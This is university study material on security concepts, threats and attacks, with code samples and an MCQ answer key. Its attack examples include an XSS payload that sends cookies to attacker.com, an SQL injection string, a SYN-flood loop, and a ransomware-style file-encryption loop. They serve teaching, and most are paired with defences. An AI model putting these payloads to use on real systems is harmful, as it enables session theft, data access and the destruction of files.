# Security Concepts, Threats, and Attacks

## Comprehensive Study Material for BSc (Hons) Computer Science (NEP 2024 UGCF)

---

## 1. Introduction and Real-World Relevance

Information Security is a critical discipline in our increasingly digital world. Every day, organizations and individuals face sophisticated cyber threats that can compromise sensitive data, disrupt operations, and cause significant financial and reputational damage. According to IBM's Cost of a Data Breach Report 2023, the average cost of a data breach reached $4.45 million globally—highlighting the critical importance of understanding security concepts, threats, and attack mechanisms.

For BSc (Hons) Computer Science students at Delhi University, this unit forms the foundation of cybersecurity knowledge prescribed under the NEP 2024 UGCF curriculum. Understanding how attackers exploit systems, identifying vulnerabilities, and implementing appropriate countermeasures are essential skills for any computer science professional.

This study material provides comprehensive coverage of security concepts, the threat landscape, various attack vectors, and practical examples to prepare students for both examinations and real-world security challenges.

---

## 2. Core Security Concepts

### 2.1 The CIA Triad

The CIA Triad represents the three fundamental principles of information security:

**Confidentiality** ensures that information is accessible only to authorized individuals. This involves protecting sensitive data from unauthorized disclosure. Examples include encryption of personal health records, password protection, and access control lists.

**Integrity** guarantees that information remains accurate and unaltered. It ensures data has not been modified, deleted, or tampered with by unauthorized parties. Digital signatures, checksums, and version control systems help maintain integrity.

**Availability** ensures that authorized users have reliable access to information and resources when needed. This involves implementing redundancy, failover systems, and protecting against denial-of-service attacks.

### 2.2 Additional Security Concepts

**Authentication** verifies the identity of users, devices, or systems before granting access. Common methods include:
- Something you know (password, PIN)
- Something you have (smart card, token)
- Something you are (biometrics)

**Authorization** determines what actions an authenticated user can perform. It implements the principle of least privilege—granting minimum necessary permissions.

**Accountability** ensures that actions can be traced to specific users through audit logs, monitoring, and logging mechanisms.

**Defense in Depth** is a layered security approach using multiple defensive mechanisms. If one layer fails, additional layers provide protection.

**Zero Trust Architecture** assumes no implicit trust—every access request must be verified, regardless of location within the network.

---

## 3. Understanding Threats, Vulnerabilities, and Risk

### 3.1 Key Definitions

**Threat** is a potential occurrence that can exploit a vulnerability to cause harm to systems or organization. Threats can be natural (floods, earthquakes), human (hackers, insiders), or technical (hardware failure, software bugs).

**Vulnerability** is a weakness or flaw in system design, implementation, or configuration that can be exploited by threats. Common vulnerabilities include:
- Unpatched software
- Weak passwords
- Misconfigured systems
- Lack of encryption
- Insecure coding practices

**Risk** is the potential for loss or damage when a threat exploits a vulnerability. Risk is often calculated as:
```
Risk = Threat × Vulnerability × Impact
```

### 3.2 Risk Management Process

1. **Risk Identification**: Discovering and documenting potential risks
2. **Risk Assessment**: Evaluating the likelihood and impact of risks
3. **Risk Treatment**: Implementing controls (mitigate, transfer, accept, avoid)
4. **Risk Monitoring**: Continuous review and update of risk posture

---

## 4. Types of Threats and Attacks

### 4.1 Classification of Attacks

**Passive Attacks** involve monitoring or collecting information without modifying systems. Examples include:
- Traffic analysis
- Eavesdropping
- Port scanning

**Active Attacks** attempt to alter system resources or affect their operation:
- Denial of Service (DoS)
- Masquerade attacks
- Message modification
- Replay attacks

### 4.2 Common Attack Vectors

**Phishing** is a social engineering attack using deceptive emails, messages, or websites to trick users into revealing sensitive information. Types include:
- Email phishing
- Spear phishing (targeted)
- Whaling (executive targeting)
- Smishing (SMS-based)
- Vishing (voice-based)

**SQL Injection (SQLi)** exploits vulnerabilities in database queries by inserting malicious SQL code:

```python
# Vulnerable code example (Python with SQLite)
user_input = "' OR '1'='1"  # Malicious input
query = f"SELECT * FROM users WHERE username = '{user_input}'"
# This executes: SELECT * FROM users WHERE username = '' OR '1'='1'
# Returns all users!

# Secure version using parameterized queries
cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))
```

**Cross-Site Scripting (XSS)** injects malicious scripts into web pages viewed by other users:

```javascript
// Malicious input in comment field
<script>document.location='http://attacker.com?cookie='+document.cookie</script>

// When other users view this comment, their cookies are stolen
```

**Distributed Denial of Service (DDoS)** overwhelms target systems with traffic from multiple sources:

```python
# Simple SYN flood example (educational purposes)
import socket

target = "192.168.1.100"
port = 80

def syn_flood():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        # In real attack, would send malformed packets rapidly

# Mitigation involves SYN cookies, rate limiting, and traffic filtering
```

**Man-in-the-Middle (MITM)** attacks intercept communication between two parties:

```python
# Concept of ARP spoofing (educational)
# Attacker sends forged ARP messages to link their MAC address with victim's IP
# All traffic flows through attacker

# Defense: Use ARP spoofing detection tools, implement port security
```

---

## 5. Malware and Ransomware

### 5.1 Types of Malware

**Virus** is self-replicating code that attaches to legitimate programs and spreads when executed. It requires user action to propagate.

**Worm** spreads independently without user intervention, exploiting network vulnerabilities.

**Trojan Horse** masquerades as legitimate software while performing malicious actions. It doesn't replicate.

**Spyware** monitors user activity and collects information without consent.

**Adware** displays unwanted advertisements, often bundled with software.

**Rootkit** provides continued privileged access while concealing its presence.

**Keylogger** records keystrokes to capture passwords and sensitive information.

### 5.2 Ransomware

Ransomware encrypts victim files and demands payment for decryption keys. Two major types:

**Crypto-ransomware** encrypts files, making them inaccessible:

```python
# Conceptual representation of encryption process
from cryptography.fernet import Fernet

# Generate key (in real attack, this key is sent to attacker)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt files
for file in target_files:
    with open(file, 'rb') as f:
        data = f.read()
    encrypted = cipher.encrypt(data)
    with open(file + '.encrypted', 'wb') as f:
        f.write(encrypted)

# Victim sees ransom note demanding payment in cryptocurrency
```

**Locker-ransomware** locks users out of their devices entirely.

**Notable Ransomware Examples**: WannaCry (2017), NotPetya, Ryuk, REvil

### 5.3 Malware Delivery Methods

- Infected email attachments
- Malicious downloads
- Exploit kits
- USB devices
- Drive-by downloads
- Social engineering

---

## 6. Threat Actors

### 6.1 Categories of Threat Actors

**Script Kiddies** are inexperienced attackers using pre-made tools for notoriety, not financial gain.

**Hacktivists** attack for political or ideological reasons, exposing information to advance causes.

**Organized Crime** groups operate for financial gain, using sophisticated methods.

**Nation-State Actors** are government-sponsored groups conducting espionage, sabotage, or intelligence gathering.

**Insiders** are employees or contractors with legitimate access who misuse their privileges.

**Advanced Persistent Threats (APTs)** are prolonged, targeted attacks where intruders gain network access and remain undetected.

---

## 7. Security Frameworks and Standards

### 7.1 Major Frameworks

**NIST Cybersecurity Framework (CSF)** provides voluntary guidance:
- Identify
- Protect
- Detect
- Respond
- Recover

**ISO/IEC 27001** is an international standard for information security management systems (ISMS).

**OWASP Top 10** identifies critical web application security risks:
1. A01:2021-Broken Access Control
2. A02:2021-Cryptographic Failures
3. A03:2021-Injection
4. A04:2021-Insecure Design
5. A05:2021-Security Misconfiguration
6. A06:2021-Vulnerable and Outdated Components
7. A07:2021-Identification and Authentication Failures
8. A08:2021-Software and Data Integrity Failures
9. A09:2021-Security Logging and Monitoring Failures
10. A10:2021-Server-Side Request Forgery

### 7.2 Security Controls

**Administrative Controls**: Policies, procedures, training, security awareness programs

**Technical Controls**: Firewalls, intrusion detection systems, encryption, access controls

**Physical Controls**: Locks, CCTV, biometric access, secure facilities

---

## 8. Practical Examples and Code Analysis

### 8.1 Secure Password Storage

```python
import bcrypt
import hashlib
import os

# NEVER store passwords in plain text
# WRONG: password = "mypassword123"

# CORRECT: Using bcrypt for secure hashing
def hash_password(password):
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode('utf-8'), hashed)

# Example usage
password = "SecureP@ssw0rd!"
hashed = hash_password(password)
print(f"Hashed: {hashed}")

# Verification
print(verify_password("SecureP@ssw0rd!", hashed))  # True
print(verify_password("wrongpassword", hashed))    # False
```

### 8.2 Input Validation to Prevent Injection

```python
import re

def validate_input(user_input):
    """Validate and sanitize user input"""
    
    # Whitelist approach - only allow specific characters
    allowed_pattern = re.compile(r'^[a-zA-Z0-9_]+$')
    
    if not allowed_pattern.match(user_input):
        return False, "Invalid characters in input"
    
    # Length validation
    if len(user_input) > 50:
        return False, "Input too long"
    
    return True, user_input

# Usage
valid, result = validate_input("user123")
print(f"Valid: {valid}, Result: {result}")

valid, result = validate_input("'; DROP TABLE users;--")
print(f"Valid: {valid}, Result: {result}")  # Blocked!
```

### 8.3 Simple Intrusion Detection Concept

```python
import time
from collections import defaultdict

class SimpleRateLimiter:
    """Rate limiting to prevent brute force attacks"""
    
    def __init__(self, max_attempts=5, time_window=60):
        self.max_attempts = max_attempts
        self.time_window = time_window
        self.attempts = defaultdict(list)
    
    def is_blocked(self, ip_address):
        """Check if IP should be blocked"""
        current_time = time.time()
        
        # Remove old attempts
        self.attempts[ip_address] = [
            t for t in self.attempts[ip_address]
            if current_time - t < self.time_window
        ]
        
        return len(self.attempts[ip_address]) >= self.max_attempts
    
    def record_failed_attempt(self, ip_address):
        """Record a failed login attempt"""
        self.attempts[ip_address].append(time.time())

# Usage
limiter = SimpleRateLimiter(max_attempts=3, time_window=60)

# Simulate failed login attempts
test_ip = "192.168.1.100"
for i in range(4):
    if limiter.is_blocked(test_ip):
        print(f"IP {test_ip} is BLOCKED!")
        break
    limiter.record_failed_attempt(test_ip)
    print(f"Attempt {i+1} recorded")
```

---

## 9. Key Takeaways

1. **CIA Triad** forms the foundation: Confidentiality, Integrity, and Availability must be balanced based on organizational needs.

2. **Understanding the threat landscape** is critical: Threats evolve constantly, and organizations must stay informed about new attack vectors.

3. **Vulnerabilities** can exist at any layer—hardware, software, or human. Regular patching, secure coding, and security awareness are essential.

4. **Defense in Depth** uses layered security: No single control is sufficient; multiple controls provide better protection.

5. **Risk management** involves identifying, assessing, and treating risks appropriately—neither over-reacting nor under-estimating.

6. **Common attacks** (phishing, SQL injection, XSS, DDoS, ransomware) require specific defenses; understanding attack mechanics helps in building effective countermeasures.

7. **Security frameworks** (NIST, ISO 27001, OWASP) provide structured approaches to implementing security programs.

8. **Secure coding practices**—input validation, proper authentication, encryption—are developer's first line of defense.

9. **Threat actors** vary from opportunistic script kiddies to sophisticated nation-state APTs; understanding motivations helps assess risk.

10. **Continuous learning** is essential as the security landscape constantly evolves with new threats, vulnerabilities, and defense mechanisms.

---

## 10. Multiple Choice Questions

### Section A: Conceptual Questions

**Q1. Which of the following represents the CIA triad in information security?**

A) Central Intelligence Agency  
B) Confidentiality, Integrity, Availability  
C) Computer Information Access  
D) Critical Infrastructure Assets  

**Answer: B**

---

**Q2. A vulnerability in information security is defined as:**

A) A potential attack on the system  
B) A weakness that can be exploited by threats  
C) A type of malware  
D) A security control measure  

**Answer: B**

---

**Q3. Which type of attack floods a target system with traffic from multiple sources to make services unavailable?**

A) Phishing  
B) SQL Injection  
C) DDoS  
D) MITM  

**Answer: C**

---

**Q4. What does the 'P' stand for in APT (advanced persistent threat)?**

A) Protection  
B) Persistent  
C) Prevention  
D) Private  

**Answer: B**

---

**Q5. Which security control type includes firewalls, IDS, and encryption?**

A) Administrative controls  
B) Physical controls  
C) Technical controls  
D) Legal controls  

**Answer: C**

---

### Section B: Application-Based Questions

**Q6. In the formula Risk = Threat × Vulnerability × Impact, if both vulnerability and impact are high but threat likelihood is low, the overall risk is:**

A) Low  
B) High  
C) Medium  
D) Zero  

**Answer: A**

---

**Q7. Which type of malware encrypts victim files and demands payment for decryption keys?**

A) Trojan  
B) Worm  
C) Ransomware  
D) Spyware  

**Answer: C**

---

**Q8. What is the primary defense against SQL injection attacks?**

A) Using stronger firewalls  
B) Parameterized queries/prepared statements  
C) Increasing network bandwidth  
D) Using biometric authentication  

**Answer: B**

---

**Q9. In the context of authentication, "something you know" includes:**

A) Fingerprint  
B) Smart card  
C) Password  
D) Retinal scan  

**Answer: C**

---

**Q10. Which OWASP Top 10 (2021) vulnerability allows attackers to interfere with database queries?**

A) Broken Access Control  
B) Injection  
C) Security Misconfiguration  
D) Insecure Design  

**Answer: B**

---

### Section C: Advanced Questions

**Q11. A user receives an email appearing to be from their bank asking for login credentials. This is an example of:**

A) DDoS attack  
B) Phishing  
C) SQL injection  
D) Buffer overflow  

**Answer: B**

---

**Q12. Which framework provides guidelines for Identify, Protect, Detect, Respond, and Recover functions?**

A) ISO 27001  
B) OWASP Top 10  
C) NIST Cybersecurity Framework  
D) PCI DSS  

**Answer: C**

---

**Q13. The principle of least privilege means:**

A) Giving users maximum access to all resources  
B) Granting minimum necessary permissions to perform job functions  
C) Restricting access only to executives  
D) Using weak passwords for simplicity  

**Answer: B**

---

**Q14. What type of attack intercepts communication between two parties to steal or modify data?**

A) Phishing  
B) Man-in-the-Middle  
C) Ransomware  
D) Worm  

**Answer: B**

---

**Q15. Which of the following is the MOST secure method for password storage?**

A) Storing in plain text  
B) Using MD5 hash  
C) Using bcrypt or scrypt  
D) Writing in a text file  

**Answer: C**

---

### Answer Key

| Q No. | Answer |
|-------|--------|
| 1 | B |
| 2 | B |
| 3 | C |
| 4 | B |
| 5 | C |
| 6 | A |
| 7 | C |
| 8 | B |
| 9 | C |
| 10 | B |
| 11 | B |
| 12 | C |
| 13 | B |
| 14 | B |
| 15 | C |

---

*This study material is prepared in accordance with the Delhi University NEP 2024 UGCF syllabus for BSc (Hons) Computer Science, Information Security unit.*